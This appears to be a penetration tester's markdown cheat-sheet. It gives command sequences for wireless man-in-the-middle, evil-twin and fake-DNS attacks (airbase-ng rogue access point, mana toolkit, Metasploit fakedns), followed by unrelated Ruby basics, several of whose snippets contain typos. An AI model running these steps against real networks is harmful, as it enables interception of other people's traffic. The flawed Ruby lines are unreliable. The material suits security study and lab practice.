**Man in the Middle Attack**
```
# Put Wirekess interface to Monitor mode
$ airmon-ng start <intf>


# Start/Set-up Access Point
$ airbase-ng -c <channel> -e "Free Internet" <intf>


# Create a Network Bridge Interface
$ apt-get install bridge-utils                  # brctl: Command not found
$ brctl addbr br0
$ brctl addif br0 eth0
$ brctl addif br0 at0

> br0  = bridge interface
> eth0 = attacker wired interface
> at0  = virtual interface created by airbase-ng


# Assign IP Address to bridged interface
{
$ ifconfig eth0 0.0.0.0 up
$ ifconfig at0 0.0.0.0 up
}
$ ifconfig br0 <ip_address> up


# Enable Port-Forwarding
$ echo 1 > /proc/sys/net/ipv4/ip_forward


# Capture Packets/Data
> Wireshark
> Tcpdump
  tcpdump -nvi <intf> tcp port 80 -A

```


**Evil Twins Attack**
```
# https://github.com/sensepost/mana

$ apt install mana-toolkit                   # Linux Install
$ /usr/share/mana-toolkit/run-mana/          # Mana Scripts
$ /etc/mana-toolkit/hostapd-mana.conf        # Configuration File
$ /usr/share/mana-toolkit/www/portal         # Location of Landing Page


-----------------------------------------

# Metasploit - Fake DNS
msf > use auxiliary/server/fakedns
msf > SET TARGETACTION FAKE
msf > SET TARGETDOMAIN *
msf > SET 10.0.0.1
msf > exploit -j

-----------------------------------------




NOTE : Upon Deauthentication of the client, the client should auto-reconnect to the AP with the stronger signal ( The attacker controlled AP )
```


**WPA2-Enterprise**
```
# https://github.com/s0lst1c3/eaphammer

```


**Wardriving**
```
# https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&hl=en

# https://wigle.net/
```




# Ruby & Metasploit

#### Instalation / Fundamentals
```
# Installation
$ sudo apt-get install <ruby_version>        # Linux
$ brew install ruby                          # MacOS

# https://www.ruby-lang.org/en/documentation/ruby-from-other-languages/

-----------------------------------------------------------------------------

$ ruby hello.rb             # Ruby from a File
$ ruby -e " puts 'Hello"    # Ruby from Command Line
$ irb                       # Interactive Ruby

#!/usr/bin/ruby             # shebang

-----------------------------------------------------------------------------

# Ruby One-Liners
$ ruby -ep 0 file.txt                            # Display content of file
$ ruby -ne 'END {print "Lines:",$.,"\n"}' file   # Display Number of Lines
$ ruby -i -pe 'gsub "foo","FOO"' file            # Change foo to FOO


------------------------------------------------------------------------------

# Librarys
$ gem list                 # Local Librarys
$ gem install [Library]    # Install Library
$ gem install pry          # Install pry library

-------------------------------------------------------------------------------
```

Interegers
```ruby
puts 2+2
puts 3.+3
puts 4.4+5

puts 4.odd?
puts 4.even?
puts 4.next
puts 4.pred

puts 25.to_s
puts 65.chr

```

**Strings**
```ruby

# Quotes
puts %[Hello "World"]
puts %Q[Hello "World"]
puts %q[Hello "World"]


# Info about strings
st = "myString"
st.empty?
st.frozen?
st.clear
st.lenght
st.size
st.start_with? "my"
st.end_with? "ing"



# Heredoc
st = <<END 
and it Heredoc
Script and
awesome
END
puts st



# String Arithmetics
st = "MyString is Perl"
st << "NotMyString"
st * 5
st[Perl] = "Ruby"
st[0] = "m"
st[0..5] = "MyAbs"
st[0..5] = "M"


st.sub("Perl","Ruby")
st.gsub("Perl","Ruby")
st.sub!("Perl","Ruby")
st.gsub!("Perl","Ruby")

st.insert(0,"m")
st.insert(-2,"M")
st.insert(st.size,"World")



# Interpolation
puts "My name is #{Ruby Code}"
puts %[My name is #{Ruby Code}]


# Some Useful Method
st = "Mystring"
st.upcase
st.downcase
st.capitalize
st.reverse
st.chop
```


**Arrays**
```ruby

```

